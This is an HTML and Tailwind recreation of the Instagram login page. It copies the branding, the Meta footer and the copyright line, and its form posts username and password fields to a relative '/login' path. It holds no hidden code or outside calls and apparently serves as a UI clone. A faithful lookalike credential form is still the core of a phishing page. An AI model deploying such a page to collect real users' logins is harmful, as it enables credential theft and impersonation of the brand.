<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Login • Instagram</title>
  <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="min-h-screen w-full bg-black flex flex-col">

  <div class="flex flex-1 flex-col lg:flex-row">

    <!-- LEFT: marketing panel -->
    <div class="flex-1 flex flex-col px-10 py-10 lg:border-r border-[#1c1c1c]">
      <!-- Logo -->
      <svg width="56" height="56" viewBox="0 0 48 48" class="mb-16">
        <defs>
          <radialGradient id="ig-grad" cx="30%" cy="107%" r="150%">
            <stop offset="0%" stop-color="#fdf497" />
            <stop offset="5%" stop-color="#fdf497" />
            <stop offset="45%" stop-color="#fd5949" />
            <stop offset="60%" stop-color="#d6249f" />
            <stop offset="90%" stop-color="#285AEB" />
          </radialGradient>
        </defs>
        <rect x="1" y="1" width="46" height="46" rx="14" fill="url(#ig-grad)" />
        <rect x="13" y="13" width="22" height="22" rx="7" fill="none" stroke="#fff" stroke-width="2.5" />
        <circle cx="24" cy="24" r="6" fill="none" stroke="#fff" stroke-width="2.5" />
        <circle cx="32" cy="16" r="1.4" fill="#fff" />
      </svg>

      <!-- Headline -->
      <h1 class="text-white text-4xl lg:text-5xl font-medium leading-tight mb-16 max-w-xl">
        See everyday moments from your
        <span class="bg-gradient-to-r from-orange-400 via-pink-500 to-fuchsia-600 bg-clip-text text-transparent">close friends</span>.
      </h1>

      <!-- Phone collage (illustrative placeholders, not real photos) -->
      <div class="relative w-full max-w-md h-80 mx-auto lg:mx-0">
        <div class="absolute left-4 top-10 w-40 h-64 rounded-xl bg-gradient-to-br from-amber-700 to-amber-900 rotate-[-8deg] shadow-2xl border-4 border-black/40"></div>
        <div class="absolute right-2 top-4 w-40 h-64 rounded-xl bg-gradient-to-br from-sky-600 to-emerald-500 rotate-[6deg] shadow-2xl border-4 border-black/40"></div>
        <div class="absolute left-1/2 -translate-x-1/2 top-0 w-44 h-72 rounded-xl bg-gradient-to-br from-orange-200 to-orange-400 shadow-2xl border-4 border-black/40 flex flex-col justify-between p-3">
          <div class="w-full h-1.5 bg-white/70 rounded-full"></div>
          <div class="flex-1 my-2 rounded-lg bg-gradient-to-br from-stone-300 to-stone-500"></div>
          <div class="flex justify-between items-center">
            <div class="w-2/3 h-1.5 bg-white/70 rounded-full"></div>
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2"><path d="M20.8 4.6a5.5 5.5 0 0 0-7.8 0L12 5.6l-1-1a5.5 5.5 0 0 0-7.8 7.8l1 1L12 21l7.8-7.6 1-1a5.5 5.5 0 0 0 0-7.8z"/></svg>
          </div>
        </div>
        <!-- floating stickers -->
        <div class="absolute -left-6 bottom-6 text-3xl">💖</div>
        <div class="absolute right-8 top-24 bg-green-500 rounded-full px-2 py-1 text-xs text-white font-semibold">★ ⌄</div>
        <div class="absolute left-14 -top-2 flex gap-1 text-xl">🌐😳🤩</div>
        <div class="absolute right-4 top-40 w-14 h-14 rounded-full bg-gradient-to-tr from-pink-500 to-yellow-400 p-0.5">
          <div class="w-full h-full rounded-full bg-stone-400"></div>
        </div>
      </div>
    </div>

    <!-- RIGHT: login form panel -->
    <div class="flex-1 flex flex-col items-center justify-center px-6 py-16">
      <div class="w-full max-w-sm">
        <h2 class="text-white text-base font-semibold mb-4">Log into Instagram</h2>

        <form method="POST" action="/login" class="flex flex-col gap-3">
          <input
            type="text"
            name="email"
            placeholder="Mobile number, username or email"
            class="bg-black border-2 border-[#262626] rounded-md px-3 py-3 text-sm text-white placeholder-gray-500 focus:outline-none focus:border-[#0095F6]"
          />
          <input
            type="password"
            name="password"
            placeholder="Password"
            class="bg-black border-2 border-[#262626] rounded-md px-3 py-3 text-sm text-white placeholder-gray-500 focus:outline-none focus:border-[#0095F6]"
          />

          <button
            type="submit"
            class="bg-[#0095F6] hover:bg-[#1877c9] text-white text-sm font-semibold rounded-full py-2.5 mt-2 transition"
          >
            Log in
          </button>

          <a href="/forgot-password" class="text-white text-sm font-semibold text-center mt-4">
            Forgot password?
          </a>
        </form>

        <div class="mt-10 flex flex-col gap-3">
          <button
            type="button"
            class="flex items-center justify-center gap-2 bg-[#222222] text-gray-300 text-sm font-semibold rounded-full py-2.5 hover:bg-[#2a2a2a] transition"
          >
            <svg width="16" height="16" viewBox="0 0 24 24" fill="#0866FF">
              <path d="M22 12c0-5.523-4.477-10-10-10S2 6.477 2 12c0 4.991 3.657 9.128 8.438 9.878v-6.987h-2.54V12h2.54V9.797c0-2.506 1.492-3.89 3.777-3.89 1.094 0 2.238.195 2.238.195v2.46h-1.26c-1.243 0-1.63.771-1.63 1.562V12h2.773l-.443 2.89h-2.33v6.988C18.343 21.128 22 16.991 22 12z" />
            </svg>
            Log in with Facebook
          </button>

          <a href="/signup" class="text-center border border-[#0095F6] text-[#0095F6] text-sm font-semibold rounded-full py-2.5 hover:bg-[#001a2e] transition">
            Create new account
          </a>
        </div>

        <div class="mt-10 flex items-center justify-center gap-1.5 text-gray-500 text-sm">
          <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
            <path d="M6.9 4.5c-2.9 0-5.4 2.6-5.4 6 0 2.3 1.3 4.2 2.8 5.8l7.4 7.7c.2.2.5.3.7.3s.5-.1.7-.3l7.4-7.7c1.5-1.6 2.8-3.5 2.8-5.8 0-3.4-2.5-6-5.4-6-1.9 0-3.6 1-4.9 2.6l-.6.7-.6-.7c-1.3-1.6-3-2.6-4.9-2.6z" />
          </svg>
          Meta
        </div>
      </div>
    </div>
  </div>

  <!-- Footer -->
  <div class="w-full border-t border-[#1c1c1c] px-6 py-4">
    <div class="max-w-5xl mx-auto flex flex-wrap gap-x-4 gap-y-2 justify-center">
      <a href="#" class="text-[11px] text-gray-500 hover:underline">Meta</a>
      <a href="#" class="text-[11px] text-gray-500 hover:underline">About</a>
      <a href="#" class="text-[11px] text-gray-500 hover:underline">Blog</a>
      <a href="#" class="text-[11px] text-gray-500 hover:underline">Jobs</a>
      <a href="#" class="text-[11px] text-gray-500 hover:underline">Help</a>
      <a href="#" class="text-[11px] text-gray-500 hover:underline">API</a>
      <a href="#" class="text-[11px] text-gray-500 hover:underline">Privacy</a>
      <a href="#" class="text-[11px] text-gray-500 hover:underline">Terms</a>
      <a href="#" class="text-[11px] text-gray-500 hover:underline">Locations</a>
      <a href="#" class="text-[11px] text-gray-500 hover:underline">Popular</a>
      <a href="#" class="text-[11px] text-gray-500 hover:underline">Instagram Lite</a>
      <a href="#" class="text-[11px] text-gray-500 hover:underline">Meta AI</a>
      <a href="#" class="text-[11px] text-gray-500 hover:underline">Muse</a>
      <a href="#" class="text-[11px] text-gray-500 hover:underline">Threads</a>
      <a href="#" class="text-[11px] text-gray-500 hover:underline">Contact Uploading & Non-Users</a>
      <a href="#" class="text-[11px] text-gray-500 hover:underline">Meta Verified</a>
    </div>
    <div class="text-center text-[11px] text-gray-600 mt-3">© 2026 Instagram from Meta</div>
  </div>

</body>
</html>
